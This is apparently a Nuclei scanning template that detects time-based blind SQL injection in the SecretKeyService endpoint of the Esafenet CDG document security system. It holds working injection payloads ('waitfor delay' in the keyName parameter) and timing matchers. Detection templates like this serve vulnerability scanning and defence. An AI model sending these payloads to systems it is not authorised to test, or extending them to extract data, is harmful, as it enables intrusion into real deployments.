id: esafenet-secretkeyservice-sql-injection-time-based

info:
  name: "亿赛通 SecretKeyService 接口 SQL 时间盲注漏洞"
  author: onewin
  severity: high
  description: 亿赛通电子文档安全管理系统 SecretKeyService SQL时间盲注漏洞（低误报版）
  tags: 亿赛通
  metadata:
    verified: true
    max-request: 2

http:
  - raw:
      # -------------------------
      # 1️⃣ 延时 3 秒
      # -------------------------
      - |
        @timeout: 30s
        GET /CDGServer3/SecretKeyService?command=sameKeyName&keyName=1'+waitfor+delay+'0:0:3'--+ HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0
        Accept: */*
        Connection: close

      # -------------------------
      # 2️⃣ 延时 6 秒
      # -------------------------
      - |
        @timeout: 30s
        GET /CDGServer3/SecretKeyService?command=sameKeyName&keyName=1'+waitfor+delay+'0:0:6'--+ HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0
        Accept: */*
        Connection: close

    max-redirects: 3

    matchers-condition: and

    matchers:
      # 状态码验证
      - type: dsl
        dsl:
          - "status_code_1 == 200"
          - "status_code_2 == 200"

      # 时间阶梯验证
      - type: dsl
        dsl:
          - "duration_1 >= 3 && duration_1 <= 5"
          - "duration_2 >= 6 && duration_2 <= 8"
          - "duration_2 - duration_1 >= 2"

      # 响应特征辅助验证（降低误报）
      - type: word
        part: header_1
        words:
          - "Content-Length: 1"

      - type: word
        part: header_2
        words:
          - "Content-Length: 1"